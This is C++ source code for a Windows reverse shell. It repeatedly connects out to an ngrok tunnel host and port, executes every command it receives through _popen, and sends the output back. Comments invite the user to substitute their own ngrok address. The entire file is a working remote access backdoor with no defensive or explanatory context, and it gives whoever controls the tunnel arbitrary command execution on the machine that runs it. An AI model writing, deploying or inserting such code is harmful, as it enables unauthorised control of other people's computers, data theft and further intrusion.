#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

int sock;

void shell() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (true) {
        memset(buffer, 0, sizeof(buffer));
        memset(container, 0, sizeof(container));
        memset(total_response, 0, sizeof(total_response));

        int bytesReceived = recv(sock, buffer, sizeof(buffer), 0);
        if (bytesReceived <= 0) break;

        if (strncmp("q", buffer, 1) == 0) {
            closesocket(sock);
            exit(0);
        }

        FILE* fp = _popen(buffer, "r");
        if (!fp) continue;

        while (fgets(container, sizeof(container), fp) != NULL) {
            strcat_s(total_response, container);
        }
        _pclose(fp);

        send(sock, total_response, strlen(total_response), 0);
    }
}

int main() {
    const char* host = "0.tcp.in.ngrok.io";  // Replace with your ngrok address
    const char* port = "11034";              // Replace with your ngrok port

    WSADATA wsaData;
    struct addrinfo hints = {}, *res = NULL;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return 1;

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    while (true) {
        if (getaddrinfo(host, port, &hints, &res) != 0) {
            Sleep(3000);
            continue;
        }

        sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (sock == INVALID_SOCKET) {
            freeaddrinfo(res);
            Sleep(3000);
            continue;
        }

        if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == 0) {
            std::cout << "[*] Connected to " << host << ":" << port << std::endl;
            freeaddrinfo(res);
            break;
        }

        closesocket(sock);
        freeaddrinfo(res);
        Sleep(5000);
    }

    shell();
    return 0;
}
